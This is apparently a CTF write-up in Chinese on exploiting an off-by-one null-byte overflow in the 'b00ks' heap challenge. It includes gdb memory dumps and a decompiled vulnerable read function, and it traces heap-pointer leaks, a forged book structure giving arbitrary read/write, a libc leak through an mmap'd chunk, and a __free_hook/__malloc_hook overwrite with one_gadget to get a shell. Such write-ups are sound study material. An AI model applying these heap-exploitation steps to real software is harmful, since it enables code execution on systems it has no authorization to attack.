最近在学习堆中offbyone的利用，写下调试过程。
之前学习栈的时候，大部分时候都是靠脑子计算。学习了house of orange，offbyone和单个gets拿shell后才知道调试的重要性，写exp的时候只能写一点，gdb挂上去调试调试，只有精准布置内存数据，才能成功。

### 利用：offbyone溢出。
程序开启了以下保护：
```
[*] '/mnt/hgfs/Desktop/offbyone/book/b00ks'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
由于开启了PIE，不好调试。但是本地可以关闭ASLR,那么程序加载的基址是固定的，加上IDA中的偏移即可下断点。加载的基址可以通过查看/proc/xxx/maps得到：
```
555555554000-555555556000 r-xp 00000000 00:32 26189                      /mnt/hgfs/Desktop/offbyone/book/b00ks
555555755000-555555756000 r--p 00001000 00:32 26189                      /mnt/hgfs/Desktop/offbyone/book/b00ks
555555756000-555555757000 rw-p 00002000 00:32 26189                      /mnt/hgfs/Desktop/offbyone/book/b00ks
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 1050563                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 1050563                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 1050563                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 1050563                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 
7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 1050535                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7fd7000-7ffff7fda000 rw-p 00000000 00:00 0 
7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 1050535                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 1050535                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```
其中0x555555554000即是加载基址。

create函数创建的结构体如下：
```
    struct book_structure
    {
       long long book_rank
       char *name_ptr
       char *description
       long long size
    }
    ----low addr ----
    name chunk
    description chunk
    book structure chunk
    ----high addr-----
```

my_read函数中有NULL字节溢出：
```
signed __int64 __fastcall read_offbyone(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]
  _BYTE *buf; // [rsp+18h] [rbp-8h]
  if ( a2 <= 0 )
    return 0LL;
  buf = a1;
  for ( i = 0; ; ++i )
  {
    if ( (unsigned int)read(0, buf, 1uLL) != 1 )
      return 1LL;
    if ( *buf == 10 ) //如果是回车，直接break，将回车替换成\x00
      break;
    ++buf;
    if ( i == a2 )
      break;
  }
  *buf = 0;
  return 0LL;
}
```
**输入字符串后会自动在字符串的末尾加上\x00来截断字符串。**

程序开始时输入author名字：
```
signed __int64 change()
{
  printf("Enter author name: ");
  if ( !(unsigned int)read_offbyone(authorname_ptr, 32) )
    return 0LL;
  printf("fail to read author_name", 32LL);
  return 1LL;
}
```
如果输入的字符串的长度是32，那么\X00字节就会加在第33个字节上,即加上book_struct中，这时create一个book，则会将这个\x00覆盖掉。
```
.data:0000000000202010 book_struct_ptr dq offset book_struct   ; DATA XREF: sub_B24:loc_B38↑o
.data:0000000000202010                                         ; delete:loc_C1B↑o ...
.data:0000000000202018 authorname_ptr  dq offset author_name   ; DATA XREF: change+15↑o

.bss:0000000000202040 author_name     db 20h dup(?)           ; DATA XREF: .data:authorname_ptr↑o
.bss:0000000000202060 book_struct     db    ? ;               ; DATA XREF: .data:book_struct_ptr↑o
```
没有create book之前：
```
pwndbg> x/8gx (0x555555554000+0x202040)
0x555555756040: 0x4141414141414141      0x4141414141414141
0x555555756050: 0x4141414141414141      0x4141414141414141
0x555555756060: 0x0000000000000000      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000`
```
create book 之后，\x00 被book1的地址覆盖掉：
```
pwndbg> x/8gx (0x555555554000+0x202040)
0x555555756040: 0x4141414141414141      0x4141414141414141
0x555555756050: 0x4141414141414141      0x4141414141414141
0x555555756060: 0x0000555555757460      0x0000000000000000
0x555555756070: 0x0000000000000000      0x0000000000000000
```
则调用print函数，可以造成泄露，将book1的地址打印出来。

### 如何造成任意读写：
可以再次利用my_read函数中的offbyone漏洞，将book_struct中的低位第一个字节覆盖为NULL，那么保存的book1的地址就缩小，使得这个地址落在可控范围内。这是因为chunk布局如下：
```
    ----low addr ----
    name chunk
    description chunk
    book structure chunk
    ----high addr-----
```
book_struct 中保存的指针指向的是book_structure chunk ,**如果缩小了，将其落入description chunk中，那么就可以伪造一个book结构，**再使用edit函数还造成任意写和任意读。注意description chunk 应该申请的大一点。

没覆盖前：
```
pwndbg> x/8gx (0x555555554000+0x202040)
0x555555756040: 0x4141414141414141      0x4141414141414141
0x555555756050: 0x4141414141414141      0x4141414141414141
0x555555756060: 0x0000555555758180      0x00005555557581b0
0x555555756070: 0x0000000000000000      0x0000000000000000
```
保存的指针值是0x0000555555758180
**覆盖后指针指会变成0x0000555555758100**
```
pwndbg> x/8gx (0x555555554000+0x202040)
0x555555756040: 0x4141414141414141      0x4141414141414141
0x555555756050: 0x4141414141414141      0x4141414141414141
0x555555756060: 0x0000555555758100      0x00005555557581b0
0x555555756070: 0x0000000000000000      0x0000000000000000
```
此时的堆布局如下：
```
0x555555758010 FASTBIN {  //name chunk
  prev_size = 0, 
  size = 81, 
  fd = 0x41, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555758060 PREV_INUSE { //description chunk
  prev_size = 0, 
  size = 273, 
  fd = 0x4141414141414141, 
  bk = 0x4141414141414141, 
  fd_nextsize = 0x4141414141414141, 
  bk_nextsize = 0x4141414141414141
}
0x555555758170 FASTBIN { //book strcture chunk
  prev_size = 0, 
  size = 49, 
  fd = 0x1, 
  bk = 0x555555758020, 
  fd_nextsize = 0x555555758070, 
  bk_nextsize = 0x100
}
```
指针修改为0x0000555555758100正好落入description chunk中，那么就可以伪造book chunk了。

**如何泄露libc地址：**
申请一个很大的chunk，那么ptmalloc就会使用mmap来给他分配，mmap分配的内存和libc的基址的偏移是固定的，那么泄露了mmap分配的地址即可得到libc基址。
用上一步的任意读写，泄露book2的name chunk的地址和description chunk的地址，再减去偏移即可得到libc的基址，再将__free_hook或者__malloc_hook修改为one_gadget即可getshell。

create的book2的book structure的结构如下：
```
0x5555557581a0 FASTBIN {
  prev_size = 0, 
  size = 49, 
  fd = 0x2, 
  bk = 0x7ffff7fb5010, 
  fd_nextsize = 0x7ffff7f93010, 
  bk_nextsize = 0x21000
}
```
其中保存的有name chunk ，description chunk的地址，用第一步泄露的book1的地址 加上 0x38即可指向这里。然后使用print函数泄露。

完整的exp参考上传的文件。
